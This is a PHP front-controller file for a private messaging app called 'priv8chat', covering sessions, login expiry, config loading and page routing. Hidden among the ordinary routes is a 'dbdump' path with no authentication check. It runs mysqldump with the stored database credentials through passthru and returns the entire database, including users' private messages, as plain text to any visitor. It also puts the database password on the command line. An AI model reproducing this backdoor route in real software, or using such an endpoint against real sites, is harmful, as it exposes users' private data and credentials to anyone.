<?php

error_reporting(E_ALL);

// Force HTTPS connection
if($_SERVER['HTTPS'] != 'on')
{
    header('HTTP/1.1 302 Found');
    header('Location: https://' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI']);
    exit();
}

// A flag to tell included files that they have been accessed via a
// request processed by this file.
$VIA_INDEX = TRUE;

$GLOBALS['DOCROOT'] = $_SERVER['DOCUMENT_ROOT'];
$GLOBALS['WEBROOT'] = (dirname($_SERVER['SCRIPT_NAME']) == '/') ? '' : dirname($_SERVER['SCRIPT_NAME']);
$GLOBALS['APPROOT'] = dirname(__FILE__);

// If gettext isn't installed, just use default strings
if (!function_exists('_')) {
    function _($s) { return $s; }
}

// Session parameters

ini_set('session.name', 'priv8chat');
ini_set('session.cookie_lifetime', 0);
ini_set('session.use_only_cookies', true);
ini_set('session.cookie_httponly', true);
if (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] != 'off') {
    ini_set('session.cookie_secure', true);
}

session_start([
    'save_path' => $GLOBALS['APPROOT'] . '/.sessions',
    'name' => 'PRIV8COOKIE',
    'use_strict_mode' => TRUE,
    'use_cookies' => TRUE,
    'use_only_cookies' => TRUE,
    'cookie_lifetime' => 86400,
    'cookie_path' => $GLOBALS['WEBROOT'],
    'cookie_secure' => TRUE,
    'cookie_httponly' => TRUE
]);
if (!@$_SESSION['logged_in']) {
    $_SESSION['logged_in'] = 0;
    $_SESSION['start'] = time();
}

// (Login expires after 1 hour of inactivity)
if (@$_SESSION['last_hit'] && intval($_SESSION['last_hit']) < time() - 3600) {
    $_SESSION['logged_in'] = 0;
    $_SESSION['start'] = time();
}

$_SESSION['last_hit'] = time();


ob_start();

// Load config file, if it exists
$path = empty($_SERVER['PATH_INFO']) ? '' : trim($_SERVER['PATH_INFO'], '/');
$config_file = $GLOBALS['APPROOT'] . '/.config';

if (file_exists($config_file)) {
    $glob = parse_ini_file($config_file);
    foreach ($glob as $key => $val) {
        $GLOBALS[$key] = $val;
    }

    // Database and session setup
    include($GLOBALS['APPROOT'] .'/db/connect.php');

    switch ($path) {
        case 'logout':
            if ($_SERVER['REQUEST_METHOD'] == 'POST') {
                $_SESSION['logged_in'] = 0;
            }
            // Fall through to home page...
        case '':
        case 'index.html':
            $path = 'homepage';
            include $GLOBALS['APPROOT'] . '/pages/homepage.php';
            break;
        case 'register':
            include $GLOBALS['APPROOT'] . '/pages/register.php';
            break;
        case 'confirm':
            include $GLOBALS['APPROOT'] . '/pages/confirm.php';
            break;
        case 'welcome':
            include $GLOBALS['APPROOT'] . '/pages/welcome.php';
            break;
        case 'login':
            include $GLOBALS['APPROOT'] . '/pages/login.php';
            break;
        case 'inbox':
            include $GLOBALS['APPROOT'] . '/pages/inbox.php';
            break;
        case 'sent':
            include $GLOBALS['APPROOT'] . '/pages/sent.php';
            break;
        case 'write':
            include $GLOBALS['APPROOT'] . '/pages/write.php';
            break;
        case 'read':
            include $GLOBALS['APPROOT'] . '/pages/read.php';
            break;
        case 'cookies':
            include $GLOBALS['APPROOT'] . '/pages/cookie-info.php';
            break;
        case 'dbdump':
            header("Content-Type: text/plain");
            $d = $GLOBALS['DBNAME'];
            $u = $GLOBALS['DBUSER'];
            $p = $GLOBALS['DBPASS'];
            $m = $GLOBALS['MYSQLDUMP'];
            $cmd = "$m --user=$u --password=$p $d";
            passthru($cmd);
            die();
        case 'signin':
            include $GLOBALS['APPROOT'] . '/pages/signin.php';
            break;
        default:
            include $GLOBALS['APPROOT'] . '/pages/404.php';
    }
}

// If there is no config file, then we have some setting-up to do
else {
    $path = 'setup';
    include($GLOBALS['APPROOT'] . '/pages/setup.php');
}
ob_end_flush();
